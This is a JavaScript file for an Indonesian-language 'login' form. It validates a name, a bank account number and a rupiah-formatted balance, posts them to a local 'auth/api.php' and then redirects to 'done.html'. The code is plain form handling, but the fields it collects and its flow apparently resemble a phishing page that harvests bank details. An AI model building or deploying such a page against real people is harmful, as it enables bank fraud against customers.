const form = document.getElementById('loginForm');
const namaInput = document.getElementById('nama');
const rekeningInput = document.getElementById('rek');

rekeningInput.addEventListener('input', function(e) {
    // Allow only numbers
    this.value = this.value.replace(/[^0-9]/g, '');

    // Validate length (max 15 digits)
    if (this.value.length > 15) {
        this.value = this.value.slice(0, 15);
    }

    // Visual feedback - valid if more than 9 digits
    if (this.value.length > 9) {
        this.classList.add('valid-input');
        this.classList.remove('invalid-input');
    } else if (this.value.length > 0) {
        this.classList.remove('valid-input');
        this.classList.add('invalid-input');
    } else {
        this.classList.remove('valid-input', 'invalid-input');
    }
});

namaInput.addEventListener('input', function() {
    // Basic name validation
    if (this.value.length >= 3) {
        this.classList.add('valid-input');
        this.classList.remove('invalid-input');
    } else if (this.value.length > 0) {
        this.classList.remove('valid-input');
        this.classList.add('invalid-input');
    } else {
        this.classList.remove('valid-input', 'invalid-input');
    }
});

// Saldo formatting
const saldoInput = document.getElementById('saldo');

saldoInput.addEventListener('input', function(e) {
    // Remove all non-numeric characters
    let value = this.value.replace(/[^0-9]/g, '');

    // If empty, clear the field
    if (value === '') {
        this.value = '';
        this.classList.remove('valid-input', 'invalid-input');
        return;
    }

    // Convert to number and format with thousand separators
    let numericValue = parseInt(value);
    let formattedValue = numericValue.toLocaleString('id-ID');

    // Add Rp. prefix
    this.value = 'Rp. ' + formattedValue;

    // Visual feedback - valid if more than 0
    if (numericValue > 0) {
        this.classList.add('valid-input');
        this.classList.remove('invalid-input');
    } else {
        this.classList.remove('valid-input');
        this.classList.add('invalid-input');
    }
});

// Before form submission, convert back to numeric value
document.getElementById('loginForm').addEventListener('submit', function(e) {
    let saldoValue = saldoInput.value.replace(/[^0-9]/g, '');
    saldoInput.value = saldoValue;
});

// Function to handle form submission
function sendLogin() {
    event.preventDefault(); // Prevent default form submission

    // Show loading gif
    document.querySelector('.wait').classList.add('show');

    // Disable submit button to prevent double submission
    document.getElementById('kirim').disabled = true;

    // Get form data
    const formData = new FormData(document.getElementById('loginForm'));

    // Wait for 2 seconds to show loading, then submit to API
    setTimeout(function() {
        fetch('auth/api.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                // Hide loading gif
                document.querySelector('.wait').classList.remove('show');

                // Re-enable submit button
                document.getElementById('kirim').disabled = false;

                if (data.status === 'success') {
                    // Redirect to done.html
                    window.location.href = 'done.html';
                } else {
                    alert('Error: ' + data.message);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                // Hide loading gif
                document.querySelector('.wait').classList.remove('show');

                // Re-enable submit button
                document.getElementById('kirim').disabled = false;

                alert('Terjadi kesalahan saat mengirim data');
            });
    }, 2000); // Show loading for 2 seconds
}